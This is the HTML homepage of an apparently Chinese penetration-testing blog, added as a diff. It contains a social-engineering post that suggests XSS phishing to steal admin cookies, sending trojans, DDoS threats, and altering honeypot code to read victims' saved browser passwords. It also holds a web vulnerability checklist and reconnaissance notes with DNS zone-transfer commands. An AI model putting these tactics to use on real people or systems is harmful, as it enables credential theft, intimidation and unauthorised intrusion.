@@ -1,0 +1,1657 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta property="og:type" content="website">
+<meta property="og:title" content="渗透测试经验及技巧">
+<meta property="og:url" content="https://shentoux.github.io/index.html">
+<meta property="og:site_name" content="渗透测试经验及技巧">
+<meta property="og:locale">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://shentoux.github.io/"/>
+
+
+
+
+
+  <title>渗透测试经验及技巧</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left 
+  page-home">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">渗透测试经验及技巧</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-guestbook">
+          <a href="/guestbook/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-comment"></i> <br />
+            
+            留言
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+  <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shentoux.github.io/2022/11/14/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试经验及技巧">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2022/11/14/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%94%BB%E5%87%BB/" itemprop="url">社会工程学攻击经验总结</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-11-14T19:44:42+08:00">
+                2022-11-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="社会工程学攻击总结"><a href="#社会工程学攻击总结" class="headerlink" title="社会工程学攻击总结"></a>社会工程学攻击总结</h2><ol>
+<li><p>是否有客服？聊天交互引导点击，制作xss钓鱼点击获取后台cookie，发送木马等，ddos攻击威胁等…</p>
+</li>
+<li><p>将图片网页链接放进word、excle文档中，让对方点击获取ip</p>
+</li>
+<li><p>通过攻击嫌疑人网站引导嫌疑人攻击自己的蜜罐，通过向嫌疑人网站写入日志内容的方式不断攻击嫌疑人的网站，激怒对方，自己的链接可放上社交聊天的小号。</p>
+<p>比如添加 Referer: <a target="_blank" rel="noopener" href="http://chsi-com.org.cn/">http://chsi-com.org.cn/</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/stcs3475/img/1647307767.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/stcs3475/img/1647308059(1).png"></p>
+<p>查看日志：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/stcs3475/img/1647308207(1).png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/stcs3475/img/1647309331(1).png"></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.iculture.cc/knowledge/pig=10727">通过蜜罐技术获取攻击者的手机号、微信号</a>   修改代码后可读取电脑上其他文件，比如chrome保存的密码和浏览历史，qq等文件</p>
+</li>
+<li></li>
+</ol>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shentoux.github.io/2022/11/14/%E6%B8%97%E9%80%8F%E6%A0%87%E5%87%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试经验及技巧">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2022/11/14/%E6%B8%97%E9%80%8F%E6%A0%87%E5%87%86/" itemprop="url">渗透标准</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-11-14T19:42:07+08:00">
+                2022-11-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="渗透标准"><a href="#渗透标准" class="headerlink" title="渗透标准"></a>渗透标准</h3><h4 id="Web漏洞检测表"><a href="#Web漏洞检测表" class="headerlink" title="Web漏洞检测表"></a>Web漏洞检测表</h4><p>1 收集web相关信息，开放端口信息，服务信息等。</p>
+<p>2 严禁增&#x2F;删&#x2F;改防火墙iptables，私自开通高危端口</p>
+<p>3 检查Flash跨域策略文件crossdomain.xml是否合法</p>
+<p>4 检查是否有CSRF漏洞,(根据系统条件进行检测)</p>
+<p>5 信息泄露漏洞安全性检查（例如test.cgi、phpinfo.php、info.pho、.svn&#x2F;entries、HTTP认证泄漏漏洞、管理后台泄漏漏洞、内网信息泄漏漏洞、错误详情信息泄漏等）</p>
+<p>6 检查是否有XSS漏洞（不合法的参数不能在页面原样返回，特别是openid&#x2F;openkey）</p>
+<p>7 检查是否泄漏后台默认文件漏洞</p>
+<p>8检查Flash跨域策略文件的安全性。避免Flash注入javascript或者actionscript脚本在浏览器或者flash中执行跨站攻击</p>
+<p> 9 Cookie安全性检查</p>
+<p>10检查是否有跳转漏洞</p>
+<p>11 检查是否有Header注入漏洞</p>
+<p>12 检查是否有源代码泄漏漏洞或者备份文件</p>
+<p>13 检查是否有Frame-proxy攻击漏洞</p>
+<p>14 检查是否有SQL注入攻击漏洞</p>
+<p>15 检查是否有并发漏洞</p>
+<p>16 敏感信息检查。应用需要对可能造成客户的敏感内容，以及用户生成内容（UGC，由用户发表的言论）进行检查和过滤</p>
+<p>17 检查通过WEB页面发起的临时会话窗口的所有显示内容</p>
+<p>18 目录浏览漏洞安全性检查</p>
+<p>19 检查是否泄漏员工电子邮箱漏洞以及分机号码</p>
+<p>20 查看是否有验证码机制，以及验证码机制是否完善</p>
+<p>21 检查用户名是否可进行枚举</p>
+<p>22 检测网站路径中是否存在robots.txt</p>
+<p>23 检查是否部署了Web服务器的控制台，控制台是否存在默认帐号、口令，是否存在弱口令</p>
+<p>24 检查网站目录是否可列</p>
+<p>25 检测目标认证系统是否存在绕过的可能，未授权访问等</p>
+<p>26 检测网站登录后修改密码是否存在缺陷</p>
+<p>27 检测Web程序在处理登录过程中用户名和口令的传输是否采用了加密传输的机制</p>
+<p>28 检测弱口令，web控制台，数据库，ftp，ssh，telnet，操作系统等</p>
+<p>29 检测是否提供注销登陆功能，或者退出后session自动失效</p>
+<p>30 检测是否存在浏览器窗口闲置超时后需重新登录的机制</p>
+<p>31 检测页面中是否存在的横向越权操作</p>
+<p>32 检测应用中存在的URL是否存在纵向越权操作</p>
+<p>33 检测是否存在任意文件上传漏洞，并且是否可以解析相关木马文件</p>
+<p>34 检测是否存在任意下载，遍历下载系统或者web内的文件</p>
+<p>35 检测Web网站在处理用户提交的不存在的URL时会返回错误信息，是否可通过返回的错误信息来确认有敏感信息的泄漏问题</p>
+<p>36 检测是否存在遗留的测试页面</p>
+<p>37 检测是否会在本地存储不安全的敏感文件</p>
+<p>38 检测是否存在命令执行漏洞</p>
+<p>40 检测逻辑上的安全问题，是否存在篡改</p>
+<p>41 检测是否可通过搜索引擎进行信息收集</p>
+<h4 id="认证和授权类"><a href="#认证和授权类" class="headerlink" title="认证和授权类"></a>认证和授权类</h4><p>密码明文传输</p>
+<p>用户名枚举</p>
+<p>暴力攻击</p>
+<p>会话标示未更新</p>
+<p>未授权访问</p>
+<p>文件上传漏洞</p>
+<p>任意文件下载</p>
+<p>脆弱的SSL算法</p>
+<p>越权访问</p>
+<h4 id="命令执行类"><a href="#命令执行类" class="headerlink" title="命令执行类"></a>命令执行类</h4><p>Struts2 远程命令执行</p>
+<p>Jboss远程命令执行</p>
+<p>HTTP.sys远程代码执行漏洞</p>
+<p>文件包含</p>
+<h4 id="逻辑攻击类"><a href="#逻辑攻击类" class="headerlink" title="逻辑攻击类"></a>逻辑攻击类</h4><p>验证码功能缺陷</p>
+<p>并发漏洞</p>
+<p>Slow Http attack、慢速攻击</p>
+<p>短信攻击</p>
+<h4 id="注入攻击类"><a href="#注入攻击类" class="headerlink" title="注入攻击类"></a>注入攻击类</h4><p>SQL注入</p>
+<p>XML注入</p>
+<p>CRLF注入</p>
+<p>XFF注入</p>
+<p>XPATH注入</p>
+<p>命令注入</p>
+<p>连接或框架注入</p>
+<p>Json劫持漏洞</p>
+<p>宽字节注入</p>
+<h4 id="客户端攻击类"><a href="#客户端攻击类" class="headerlink" title="客户端攻击类"></a>客户端攻击类</h4><p>XSS跨站脚本漏洞</p>
+<p>跨站伪造请求（CSRF）</p>
+<p>不安全的HTTP方法</p>
+<h4 id="信息泄露类"><a href="#信息泄露类" class="headerlink" title="信息泄露类"></a>信息泄露类</h4><p>目录遍历</p>
+<p>Web容器控制台地址泄漏</p>
+<p>PHPInfo()信息泄漏</p>
+<p>POODLE信息泄露漏洞</p>
+<p>SVN信息泄露</p>
+<p>备份文件泄露</p>
+<p>内网IP地址泄露</p>
+<p>Cookie信息泄露</p>
+<p>异常信息泄露</p>
+<p>敏感信息泄露</p>
+<p>IIS断文件名泄露</p>
+<p>Robots文件信息泄露</p>
+<h4 id="其他类型"><a href="#其他类型" class="headerlink" title="其他类型"></a>其他类型</h4><p>跨域访问漏洞</p>
+<p>URL重定向</p>
+<p>DNS域传送漏洞</p>
+<p>开放多余端口</p>
+<p>PHP multipart&#x2F;form-data</p>
+<p>. ASP.NET Padding Oracle攻击</p>
+<p> HTTP Host头攻击</p>
+<p>SSRF攻击</p>
+<p> TLS1&#x2F;SSLv3 重协商漏洞</p>
+<p>Web服务器解析漏洞</p>
+<h4 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h4><h5 id="Web安全常见检测工具"><a href="#Web安全常见检测工具" class="headerlink" title="Web安全常见检测工具"></a>Web安全常见检测工具</h5><h6 id="APPScan"><a href="#APPScan" class="headerlink" title="APPScan"></a>APPScan</h6><p>IBM Rational AppScan，在Web安全测试中所使用的自动化扫描工具</p>
+<h6 id="WVS"><a href="#WVS" class="headerlink" title="WVS"></a>WVS</h6><p>Acunetix WVS Reporter 自动化的Web应用程序安全测试工具</p>
+<h6 id="Netsparker"><a href="#Netsparker" class="headerlink" title="Netsparker"></a>Netsparker</h6><p>一款综合型的web应用安全漏洞扫描工具</p>
+<h6 id="Httprint"><a href="#Httprint" class="headerlink" title="Httprint"></a>Httprint</h6><p>Web服务器类型和版本的探测工具</p>
+<h6 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h6><p>SQL注入测试工具</p>
+<h6 id="WireShark"><a href="#WireShark" class="headerlink" title="WireShark"></a>WireShark</h6><p>网络协议抓包与分析工具</p>
+<h6 id="Burp-suite"><a href="#Burp-suite" class="headerlink" title="Burp suite"></a>Burp suite</h6><p>神器，可以对浏览器与Web服务器之间的通信数据进行编辑修改</p>
+<h6 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h6><p>端口扫描，服务识别，操作系统指纹识别</p>
+<h6 id="NetCat"><a href="#NetCat" class="headerlink" title="NetCat"></a>NetCat</h6><p>端口连接，数据提交</p>
+<h6 id="Tamper-IE"><a href="#Tamper-IE" class="headerlink" title="Tamper IE"></a>Tamper IE</h6><p>HTTP数据包修改、转发工具（Firefox插件）</p>
+<h6 id="Fiddler"><a href="#Fiddler" class="headerlink" title="Fiddler"></a>Fiddler</h6><p>Http协议调试代理工具</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shentoux.github.io/2022/11/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试经验及技巧">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2022/11/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C/" itemprop="url">渗透测试之实战经验</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-11-14T14:57:31+08:00">
+                2022-11-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="渗透测试之实战经验"><a href="#渗透测试之实战经验" class="headerlink" title="渗透测试之实战经验"></a>渗透测试之实战经验</h2><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><h6 id="whois信息"><a href="#whois信息" class="headerlink" title="whois信息"></a>whois信息</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">站点注册人注册过的其他网站(对注册人、邮箱、电话的反查)，对查到的站点的深入</span><br></pre></td></tr></table></figure>
+
+<h6 id="是否存在CDN"><a href="#是否存在CDN" class="headerlink" title="是否存在CDN"></a>是否存在CDN</h6><p><a target="_blank" rel="noopener" href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ping、多地ping、国外ping</span><br></pre></td></tr></table></figure>
+
+<h6 id="绕过CDN找真实ip"><a href="#绕过CDN找真实ip" class="headerlink" title="绕过CDN找真实ip"></a>绕过CDN找真实ip</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">子域名</span><br><span class="line">https://dnsdb.io/zh-cn/</span><br><span class="line">Ping根域名</span><br><span class="line">Nslookup</span><br><span class="line">Cloudflare的真实IP寻找</span><br><span class="line">  http://crimeflare.org:82/cfs.html</span><br><span class="line">  https://github.com/gwen001/pentest-tools/blob/master/cloudflare-origin-ip.py</span><br><span class="line">查找老域名</span><br><span class="line">查找关联域名</span><br><span class="line">  www.baidu.com</span><br><span class="line">  www.baidu.cn</span><br><span class="line">  www.baidu.org</span><br><span class="line">  www.baidu.xyz等等</span><br><span class="line">信息泄露/配置文件</span><br><span class="line">Phpinfo</span><br><span class="line">网页源码</span><br><span class="line">Svn</span><br><span class="line">Github</span><br><span class="line">Shodan/fofa/zoomeye</span><br><span class="line">SSL证书记录</span><br><span class="line">https://censys.io/</span><br><span class="line">网站漏洞</span><br><span class="line">  Xss</span><br><span class="line">  Ssrf</span><br><span class="line">  命令执行</span><br><span class="line">  SQL注入(某种情况loadfile读取linux的ip配置文件，hosts文件等)</span><br><span class="line">DNS记录，证书记录</span><br><span class="line">设置xff/x-remote-ip/x-remote-addr为127.0.0.1/或ipv6地址</span><br><span class="line">RSS订阅/邮件头</span><br><span class="line">APP反编译搜索/截取APP的请求信息</span><br><span class="line">修改hosts文件指向</span><br></pre></td></tr></table></figure>
+
+<h6 id="域名历史IP"><a href="#域名历史IP" class="headerlink" title="域名历史IP"></a>域名历史IP</h6><p><a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p>
+<h6 id="网站架构-x2F-服务器指纹-x2F-CMS识别-x2F-容器"><a href="#网站架构-x2F-服务器指纹-x2F-CMS识别-x2F-容器" class="headerlink" title="网站架构&#x2F;服务器指纹&#x2F;CMS识别&#x2F;容器"></a>网站架构&#x2F;服务器指纹&#x2F;CMS识别&#x2F;容器</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Whatweb</span><br><span class="line">网页源代码</span><br><span class="line">请求头/响应头</span><br><span class="line">网站底部，顶部，左上角右上角</span><br><span class="line">网站报错信息</span><br><span class="line">http://www.yunsee.cn/</span><br><span class="line">域名/install</span><br><span class="line">Firefox、Chrome插件Wappalyzer</span><br><span class="line">CMS漏洞</span><br><span class="line">  定位版本对应已知漏洞检查</span><br><span class="line">  CMS未知漏洞挖掘</span><br><span class="line">Web容器已知漏洞(解析漏洞这种)</span><br><span class="line">显示网站使用的技术</span><br><span class="line">  https://builtwith.com/</span><br><span class="line">中间件、组件</span><br><span class="line">Weblogic、tomcat、zabbix、struts、axis等</span><br><span class="line">https://github.com/FortyNorthSecurity/EyeWitness</span><br></pre></td></tr></table></figure>
+
+<h6 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">老站、同样架构或同源码的子站</span><br><span class="line">爆破，接口查询</span><br><span class="line">  https://phpinfo.me/domain/</span><br><span class="line">  https://d.chinacycc.com/index.php?m=Login&amp;a=index</span><br><span class="line">  subDomainBrute、knockpy</span><br><span class="line">OWA发现、dig adfs、dig mail</span><br><span class="line">https://dns.bufferover.run/dns?q=baidu.com</span><br><span class="line">http://api.hackertarget.com/reversedns/?q=target.com</span><br></pre></td></tr></table></figure>
+
+<h6 id="网站使用的CMS的官方demo站"><a href="#网站使用的CMS的官方demo站" class="headerlink" title="网站使用的CMS的官方demo站"></a>网站使用的CMS的官方demo站</h6><p>找不到demo就找源码开发者，加群什么的，结合社会工程学要个后台截图(对于一些后台目录复杂的cms)，注意看网站上一些功能介绍的截图。</p>
+<h6 id="SSL证书"><a href="#SSL证书" class="headerlink" title="SSL证书"></a>SSL证书</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://crt.sh/?q=%25.target.com</span><br><span class="line">https://censys.io/certificates?q=target.com</span><br><span class="line">https://github.com/cheetz/sslScrape</span><br></pre></td></tr></table></figure>
+
+<h6 id="DNS历史解析记录"><a href="#DNS历史解析记录" class="headerlink" title="DNS历史解析记录"></a>DNS历史解析记录</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">https://dnsdumpster.com/</span><br><span class="line">https://censys.io/</span><br><span class="line">https://securitytrails.com/</span><br><span class="line">域传送漏洞检查</span><br><span class="line">  Dnsenum、fierce</span><br><span class="line">http://ha.ckers.org/fierce/ </span><br><span class="line">$ ./fierce.pl -dns example.com </span><br><span class="line">$ ./fierce.pl –dns example.com –wordlist myWordList.txt</span><br><span class="line"></span><br><span class="line">&gt;dig @ns.example.com example=.com AXFR </span><br><span class="line">&gt;nslookup -<span class="built_in">type</span>=ns xxx.yyy.cn <span class="comment">#查询解析某域名的DNS服务器</span></span><br><span class="line">&gt;nslookup <span class="comment">#进入nslookup交互模式</span></span><br><span class="line">&gt;server dns.domian.com <span class="comment">#指定dns服务器</span></span><br><span class="line">&gt;<span class="built_in">ls</span> xxx.yyy.cn <span class="comment">#列出域信息</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="同服站点情况"><a href="#同服站点情况" class="headerlink" title="同服站点情况"></a>同服站点情况</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://site.ip138.com/</span><br><span class="line">火狐插件flagfox,配置单击指向bing查ip对应的域名</span><br></pre></td></tr></table></figure>
+
+<h6 id="同样架构或源码的站"><a href="#同样架构或源码的站" class="headerlink" title="同样架构或源码的站"></a>同样架构或源码的站</h6><h6 id="网站js"><a href="#网站js" class="headerlink" title="网站js"></a>网站js</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/003random/getJS</span><br><span class="line">https://github.com/Threezh1/JSFinder</span><br><span class="line">或浏览器F12也可以看到加载的</span><br><span class="line">敏感信息、可能存在漏洞的参数等信息</span><br><span class="line">查看网页源代码，注释的一些信息，比如没有删掉的接口、前台没有的页面、越权、注入、js等</span><br></pre></td></tr></table></figure>
+
+<h6 id="网站使用的第三方js"><a href="#网站使用的第三方js" class="headerlink" title="网站使用的第三方js"></a>网站使用的第三方js</h6><h6 id="云信息"><a href="#云信息" class="headerlink" title="云信息"></a>云信息</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Aliyun、AWS、GCP、Azure等</span><br><span class="line">查找可公开访问的实例</span><br><span class="line">  https://github.com/gwen001/s3-buckets-finder</span><br><span class="line">  https://github.com/nccgroup/aws-inventory</span><br><span class="line">  https://github.com/jordanpotti/AWSBucketDump</span><br></pre></td></tr></table></figure>
+
+<h6 id="APP反编译"><a href="#APP反编译" class="headerlink" title="APP反编译"></a>APP反编译</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url、js、osskey、api等信息查找</span><br><span class="line">搜集到接口该怎么做</span><br><span class="line">  Fuzz常见参数</span><br></pre></td></tr></table></figure>
+
+<h6 id="C段-x2F-B段信息"><a href="#C段-x2F-B段信息" class="headerlink" title="C段&#x2F;B段信息"></a>C段&#x2F;B段信息</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Banner、是否存在目标的后台或其他入口/其他业务系统</span><br></pre></td></tr></table></figure>
+
+<h6 id="目录扫描-x2F-爬虫-慎用"><a href="#目录扫描-x2F-爬虫-慎用" class="headerlink" title="目录扫描&#x2F;爬虫(慎用)"></a>目录扫描&#x2F;爬虫(慎用)</h6><h6 id="WAF情况识别"><a href="#WAF情况识别" class="headerlink" title="WAF情况识别"></a>WAF情况识别</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/EnableSecurity/wafw00f</span><br><span class="line">做好绕过策略的计划</span><br></pre></td></tr></table></figure>
+
